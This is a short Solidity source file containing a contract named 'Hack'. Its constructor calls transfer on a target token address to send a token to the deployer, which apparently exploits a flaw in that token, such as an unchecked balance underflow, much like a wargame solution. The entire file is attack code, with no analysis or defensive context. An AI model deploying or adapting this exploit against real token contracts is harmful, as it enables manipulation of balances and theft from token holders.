
// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

interface IToken {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

contract Hack {
    constructor (address _target) public  {
        IToken(_target).transfer(msg.sender, 1);
    }
}